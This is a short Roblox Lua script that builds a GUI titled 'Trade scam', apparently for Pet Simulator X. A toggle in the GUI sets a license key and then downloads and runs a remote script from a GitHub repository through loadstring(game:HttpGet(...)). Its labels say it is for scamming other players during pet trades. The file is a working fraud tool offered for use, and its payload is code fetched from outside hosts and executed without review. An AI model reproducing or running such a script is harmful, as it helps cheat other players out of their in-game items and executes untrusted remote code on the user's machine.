local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Trade scam", "DarkTheme")
 
--Trade
local Trade = Window:NewTab("Trade")
local ScamSection = Trade:NewSection("Scam")
 
 
ScamSection:NewToggle("Trade Scam", "Put Pet a Trade and on this", function(state)
    if state then
        _G.License = "c05efa9a10fc98ec4089"
        loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
    else
        print("Toggle Off")
    end
end)
